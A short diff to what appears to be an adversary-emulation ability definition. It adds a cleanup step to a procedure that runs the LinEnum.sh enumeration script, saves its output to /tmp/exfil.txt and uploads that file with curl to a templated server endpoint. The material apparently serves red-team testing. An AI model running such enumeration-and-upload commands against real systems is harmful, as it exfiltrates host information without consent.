@@ -16,3 +16,6 @@
           ./LinEnum.sh > /tmp/exfil.txt;
           curl -F 'data=@/tmp/exfil.txt' #{server}/file/upload ;
           cat /tmp/exfil.txt;
+        cleanup: |
+          rm ./LinEnum.sh;
+          rm /tmp/exfil.txt;
